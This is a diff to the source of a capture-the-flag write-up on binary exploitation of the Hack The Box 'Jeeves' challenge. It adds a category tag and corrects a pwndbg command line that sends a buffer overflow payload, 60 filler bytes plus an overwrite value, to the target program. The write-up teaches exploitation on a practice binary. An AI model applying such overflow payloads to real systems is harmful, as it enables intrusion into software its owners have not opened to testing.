@@ -2,7 +2,7 @@
 layout: single
 title:  "Intro to Binary Exploitation: HTB Jeeves"
 date:   2023-09-08 12:30:00 +0200
-categories: ['Binary Exploitation']
+categories: ['Binary Exploitation','Hack The Box']
 classes: wide
 toc: true
 ---
@@ -147,7 +147,7 @@ print(payload)
 ```
 Or we can run it directly in GDB to test our payload first:
 ```bash
-pwndbg> r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*60 + b"\xb3\xba\x37\x13"')
+pwndbg> r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*60 + b"\xb3\xba\x37\x13")')
 ```
 
 ## Executing our payload on the target
